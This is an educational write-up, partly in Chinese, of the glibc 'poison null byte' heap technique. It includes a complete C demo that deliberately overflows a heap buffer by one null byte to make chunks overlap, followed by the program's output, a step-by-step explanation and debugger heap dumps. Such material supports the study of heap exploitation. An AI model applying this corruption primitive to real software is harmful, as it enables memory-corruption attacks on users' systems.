# poison_null_byte

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>


int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to poison null byte 2.0!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	printf("We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	printf("a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	printf("b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	printf("c: %p\n", c);

	barrier =  malloc(0x100);
	printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x1f0) = 0x200;
	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	*(size_t*)(b+0x1f0) = 0x200;

	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	printf("b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);

	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	b1 = malloc(0x100);

	printf("b1: %p\n",b1);
	printf("Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	printf("We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control

	b2 = malloc(0x80);
	printf("b2: %p\n",b2);

	memset(b2,'B',0x80);
	printf("Current b2 content:\n%s\n",b2);

	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");

	free(b1);
	free(c);
	
	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	printf("d: %p\n",d);
	
	printf("Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	printf("New b2 content:\n%s\n",b2);

	printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
		"for the clear explanation of this technique.\n");

	assert(strstr(b2, "DDDDDDDDDDDD"));
}
```

**result**

```c
Welcome to poison null byte 2.0!
Tested in Ubuntu 16.04 64bit.
This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.
We allocate 0x100 bytes for 'a'.
a: 0x2402010
Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108
b: 0x2402120
c: 0x2402330
We allocate a barrier at 0x2402440, so that c is not consolidated with the top-chunk when freed.
The barrier is not strictly necessary, but makes things less confusing
In newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'
b.size: 0x211
b.size is: (0x200 + 0x10) | prev_in_use
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x200
c.prev_size is 0x210
We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))
b1: 0x2402120
Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210
Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0
We malloc 'b2', our 'victim' chunk.
b2: 0x2402230
Current b2 content:
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2'.
d: 0x2402120
Now 'd' and 'b2' overlap.
New b2 content:
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
```

**analysis**

这一trick的前提是

- off-by-one
- disabled tcache-option

首先申请了三个chunk，a：0x100，b：0x200，c：0x100。然后申请一个barrier来防止合并，这并不是必须的，但是可以帮助我们更好的理解。

由于新版的glibc中添加了这样一个检查

```c
chunksize(P) != prev_size (next_chunk(P))
```

所以我们要将b的next_chunk的prev_size设置为b的大小，这里设置为0x200，而不是0x210，因为b是我们之后要覆写的chunk。

接着，通过对a进行off-by-one覆写b的size域的低一字节，b的size为0x200。这样我们通过了检查。

之后申请两个chunk，b1：0x100，b2：0x80。b1就是原来b的位置，但c的prev_size域并没有被更新，这是因为我们修改了b的size，使其通过偏移得到的nextchunk不再是c而是c-0x10。

然后，将b2的内容全部设为“B”，并free(b1)，free(c)。这时，就发现问题了，free(c)时通过c找到的prev_chunk是b1，它们忽略了b2！

这时，malloc(0x300)我们会得到曾经b+c的空间，而b2还在使用中！

**gdb**

申请a，b，c与barrier后

```c
next_chunkpwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x603110
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x603320
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x603430
Size: 0x111

Top chunk | PREV_INUSE
Addr: 0x603540
Size: 0x20ac1
```

伪造b之后的chunk的prev_size，这里并不是c，而是c-0x10。可以计算得出这是正确的。

```c
0x603300	0x0000000000000000	0x0000000000000000	................
0x603310	0x0000000000000200	0x0000000000000000	................
0x603320	0x0000000000000000	0x0000000000000111	................
0x603330	0x0000000000000000	0x0000000000000000	................
```

free(b)，我们没有修改b的size，所以c的prev_size被填入了0x210

```c
0x603300	0x0000000000000000	0x0000000000000000	................
0x603310	0x0000000000000200	0x0000000000000000	................
0x603320	0x0000000000000210	0x0000000000000110	................
0x603330	0x0000000000000000	0x0000000000000000	................
```

申请b1，b2

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x603110
Size: 0x111

Allocated chunk | PREV_INUSE
Addr: 0x603220
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6032b0
Size: 0x61
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x603310
Size: 0x00
```

free(b1)

```c
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x111

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603110
Size: 0x111
fd: 0x6032b0
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x603220
Size: 0x90

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x6032b0
Size: 0x61
fd: 0x7ffff7dd1b78
bk: 0x603110

Allocated chunk
Addr: 0x603310
Size: 0x00
```

free(c)

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x111

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603110
Size: 0x321
fd: 0x6032b0
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x603430
Size: 0x110

Top chunk | PREV_INUSE
Addr: 0x603540
Size: 0x20ac1
```

